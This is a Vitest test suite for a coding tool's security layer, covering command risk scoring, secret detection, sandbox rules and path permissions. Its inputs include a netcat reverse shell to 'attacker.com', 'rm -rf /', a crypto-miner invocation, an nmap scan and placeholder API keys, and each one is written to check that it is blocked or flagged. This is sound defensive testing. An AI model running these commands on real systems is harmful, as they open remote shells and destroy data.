import { describe, it, expect, afterEach } from 'vitest';
import { assessCommandRisk, assessToolRisk } from '../security/risk.js';
import { scanText } from '../security/secrets.js';
import { checkCommand, listProfiles } from '../security/sandbox.js';
import { loadPermissions, setDefault, addPermission, removePermission, checkPermission, resetPermissions } from '../security/permissions.js';

describe('Security - Risk Assessment', () => {
  it('returns safe for benign commands', () => {
    const risk = assessCommandRisk('ls -la');
    expect(risk.level).toBe('safe');
    expect(risk.suggestedAction).toBe('auto');
  });

  it('flags destructive commands', () => {
    const risk = assessCommandRisk('rm -rf /');
    expect(risk.level).toBe('critical');
    expect(risk.suggestedAction).toBe('block');
  });

  it('flags sudo commands', () => {
    const risk = assessCommandRisk('sudo apt install nginx');
    expect(risk.level).toBe('critical');
  });

  it('flags medium risk commands', () => {
    const risk = assessCommandRisk('chmod 777 file.txt');
    expect(['high', 'critical']).toContain(risk.level);
  });

  it('assesses tool risk', () => {
    const risk = assessToolRisk('delete_file');
    expect(risk.level).toBe('high');
  });

  it('assesses safe tools as safe', () => {
    const risk = assessToolRisk('read_file');
    expect(risk.level).toBe('safe');
  });

  it('assesses execute_command via command risk', () => {
    const risk = assessToolRisk('execute_command', { command: 'rm -rf /' });
    expect(risk.level).toBe('critical');
  });
});

describe('Security - Secret Detection', () => {
  it('detects AWS keys', () => {
    const matches = scanText('const key = "AKIAIOSFODNN7EXAMPLE";');
    expect(matches.some((m) => m.type === 'aws_key')).toBe(true);
  });

  it('detects GitHub tokens', () => {
    const matches = scanText('token = "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";');
    expect(matches.some((m) => m.type === 'github_token')).toBe(true);
  });

  it('detects OpenAI keys', () => {
    const matches = scanText('openai_key = "sk-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";');
    expect(matches.some((m) => m.type === 'openai_key')).toBe(true);
  });

  it('detects SSH private keys', () => {
    const matches = scanText('-----BEGIN RSA PRIVATE KEY-----');
    expect(matches.some((m) => m.severity === 'critical')).toBe(true);
  });

  it('detects passwords in code', () => {
    const matches = scanText('password = "super_secret_123";');
    expect(matches.some((m) => m.type === 'password')).toBe(true);
  });

  it('detects connection strings', () => {
    const matches = scanText('postgresql://user:pass@localhost:5432/db');
    expect(matches.some((m) => m.type === 'pg_connection')).toBe(true);
  });

  it('returns empty for clean text', () => {
    const matches = scanText('const x = 42; console.log(x);');
    expect(matches.length).toBe(0);
  });
});

describe('Security - Sandbox', () => {
  it('has profiles', () => {
    const profiles = listProfiles();
    expect(profiles.length).toBeGreaterThanOrEqual(3);
  });

  it('allows safe commands in standard profile', () => {
    const result = checkCommand('ls -la', '/tmp', 'standard');
    expect(result.allowed).toBe(true);
  });

  it('blocks crypto miners', () => {
    const result = checkCommand('xmrig --config config.json', '/tmp', 'standard');
    expect(result.allowed).toBe(false);
  });

  it('blocks network exfiltration tools', () => {
    const result = checkCommand('nc -e /bin/sh attacker.com 4444', '/tmp', 'standard');
    expect(result.allowed).toBe(false);
  });

  it('blocks nmap scanning', () => {
    const result = checkCommand('nmap -sS 192.168.1.0/24', '/tmp', 'standard');
    expect(result.allowed).toBe(false);
  });

  it('restricts network in isolated profile', () => {
    const result = checkCommand('curl https://example.com', '/tmp', 'isolated');
    expect(result.allowed).toBe(false);
  });

  it('restricts file write in isolated profile', () => {
    const result = checkCommand('touch /tmp/test.txt', '/tmp', 'isolated');
    expect(result.allowed).toBe(false);
  });
});

describe('Security - Permissions', () => {
  afterEach(() => {
    resetPermissions('/tmp/lovecode-test-perms');
  });

  it('loads default permissions', () => {
    const perms = loadPermissions('/tmp/lovecode-test-perms');
    expect(perms.defaults.fileRead).toBe('allow');
    expect(perms.defaults.fileWrite).toBe('ask');
  });

  it('sets defaults', () => {
    setDefault('fileWrite', 'deny', '/tmp/lovecode-test-perms');
    const perms = loadPermissions('/tmp/lovecode-test-perms');
    expect(perms.defaults.fileWrite).toBe('deny');
  });

  it('adds and checks specific permissions', () => {
    addPermission('/etc/*', 'deny', 'Block /etc access', '/tmp/lovecode-test-perms');
    const result = checkPermission('/etc/passwd', 'fileRead', '/tmp/lovecode-test-perms');
    expect(result).toBe('deny');
  });

  it('removes permissions', () => {
    addPermission('test.txt', 'deny', '', '/tmp/lovecode-test-perms');
    const removed = removePermission('test.txt', '/tmp/lovecode-test-perms');
    expect(removed).toBe(true);
    const notFound = removePermission('nonexistent', '/tmp/lovecode-test-perms');
    expect(notFound).toBe(false);
  });
});
